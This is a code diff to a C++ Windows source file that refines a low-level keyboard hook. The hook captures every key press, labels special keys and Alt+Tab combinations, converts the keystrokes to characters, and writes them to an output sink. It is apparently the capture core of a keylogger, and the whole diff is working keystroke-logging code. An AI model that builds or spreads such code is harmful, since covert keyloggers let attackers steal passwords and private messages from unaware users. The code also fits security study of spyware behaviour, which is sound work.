@@ -3,6 +3,9 @@
 #include <assert.h>
 #include <TlHelp32.h>
 
+bool leftAltPressed = false;
+bool tabPressed = false;
+
 /** Static variable initialization */
 UserInputEventSource *UserInputEventSource::instance = nullptr;
 HHOOK UserInputEventSource::hKeyboardHook = NULL;
@@ -19,50 +22,101 @@ UserInputEventSource *UserInputEventSource::getInstance()
 
 LRESULT CALLBACK UserInputEventSource::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-    if (nCode >= 0)
+    if (nCode == HC_ACTION)
     {
         // lParam is a pointer to a KBDLLHOOKSTRUCT
-        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
+        KBDLLHOOKSTRUCT *pKeyboard = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
 
-        switch (wParam)
+        // Handle keyup down events
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
         {
-        case WM_SYSKEYDOWN:
-            // I think we need to check for ALT separately in here. Alt is sys key.
-        case WM_KEYDOWN:
-            wchar_t unicodeBuffer[2] = {0};
-            static BYTE keyboardState[256] = {0};
-            GetKeyboardState(keyboardState);
-
-            // Check if shift key pressed
-            if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
+            // Check for ALT+TAB combo
+            if (pKeyboard->vkCode == VK_LMENU)
             {
-                std::cout << "[SHIFT]" << std::endl;
-                keyboardState[VK_SHIFT] |= 0x80;
+                leftAltPressed = true;
+            }
+            else if (pKeyboard->vkCode == VK_TAB)
+            {
+                // If we press tab and alt isnt pressed, then
+                // that means TAB+ALT was entered, not ALT+TAB, so we should
+                // just log out tab by itself and leave it as false
+                if (!leftAltPressed)
+                {
+                    *outputSink << "[TAB]";
+                    tabPressed = false;
+                }
+                else
+                {
+                    tabPressed = true;
+                }
+            }
+            else if (pKeyboard->vkCode == VK_RETURN)
+            {
+                *outputSink << "[ENTER]";
+            }
+            else if (pKeyboard->vkCode == VK_BACK)
+            {
+                *outputSink << "[BACKSPACE]";
+            }
+            else if (pKeyboard->vkCode == VK_LCONTROL)
+            {
+                *outputSink << "[LCTRL]";
+            }
+            else if (pKeyboard->vkCode == VK_LSHIFT)
+            {
+                *outputSink << "[LSHIFT]";
+            }
+            else if (pKeyboard->vkCode == VK_RSHIFT)
+            {
+                *outputSink << "[RSHIFT]";
             }
 
-            // Check if caps lock is on
-            if (GetKeyState(VK_CAPITAL) & 0x0001)
+            if (leftAltPressed && tabPressed)
             {
-                std::cout << "[CAPS LOCK]" << std::endl;
-                keyboardState[VK_CAPITAL] |= 0x01;
+                *outputSink << "[ALT+TAB]";
             }
-
-            // Check if ctrl key pressed
-            if (GetAsyncKeyState(VK_CONTROL) & 0x8000)
+            else
             {
-                std::cout << "[CTRL]" << std::endl;
-                keyboardState[VK_CONTROL] |= 0x80;
-            }
+                // If we get here and alt is pressed, that means that left alt was/is pressed, and the key
+                // that followed it was not TAB, so we'll just treat it as another combination (this is scuffed)
+                if (leftAltPressed)
+                {
+                    *outputSink << "[ALT]";
+                }
 
-            // Convert the input to unicode character (need to do this since the input can change based on kbd state
-            // and the keyboard layout)
-            if (ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 2, 0) == 1)
+                wchar_t unicodeBuffer[2] = {0};
+                static BYTE keyboardState[256] = {0};
+                GetKeyboardState(keyboardState);
+
+                // Check if shift key is currently pressed
+                if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
+                {
+                    keyboardState[VK_SHIFT] |= 0x80;
+                }
+                // Check if caps lock is on (low order bit indicates whether or not key is toggled)
+                if (GetKeyState(VK_CAPITAL) & 0x0001)
+                {
+                    keyboardState[VK_CAPITAL] |= 0x01;
+                }
+
+                // Convert the input to unicode character (need to do this since the input can change based on kbd state
+                // and the keyboard layout)
+                if (ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 2, 0) == 1)
+                {
+                    *outputSink << unicodeBuffer;
+                }
+            }
+        }
+        else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
+        {
+            if (pKeyboard->vkCode == VK_LMENU)
             {
-                // Send data to output sink
-                *outputSink << unicodeBuffer;
+                leftAltPressed = false;
             }
-
-            break;
+            else if (pKeyboard->vkCode == VK_TAB)
+            {
+                tabPressed = false;
+            }
         }
     }
 
